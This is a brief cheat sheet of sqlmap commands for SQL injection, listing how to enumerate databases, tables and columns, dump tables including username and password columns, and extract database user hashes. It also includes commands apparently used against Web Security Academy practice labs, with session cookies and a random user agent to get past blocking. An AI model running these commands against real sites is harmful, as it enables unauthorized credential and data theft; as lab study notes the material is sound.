## Basics
```
sqlmap -u "http://target.com/page?id=1" --dbs --> List all databases
sqlmap -u "http://target.com/page?id=1" -D dbname --tables --> 
List tables in a specific database
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --columns --> List columns in a table
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --dump --> Dump entire table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C username,password --dump --> Dump specific columns
sqlmap -u "http://target.com/page?id=1" --current-db --current-user --> Get current database and user
sqlmap -u "http://target.com/page?id=1" --passwords --> Extract database user hashes
```
```
sqlmap -u 'https://...web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist='  -batch 
--dbms postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'organize_by'

sqlmap -u 'https://...web-security-academy.net/filtered_search?find=&organize=&order=&BlogArtist=' -batch --dbms 
postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'order' --> will get 
critical error, looks like something is blocking => add random agent options:

sqlmap -u 'https://...web-security-academy.net/filtered_search?find=&organize=&order=&BlogArtist=' -batch --dbms 
postgresql --technique E --level 5 -D public -T users --dump --cookie='session=YOUR-COOKIE' -p 'order' --random-agent
```

## Refs
- https://payloadplayground.com/cheatsheets/sqlmap
- https://hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap/index.html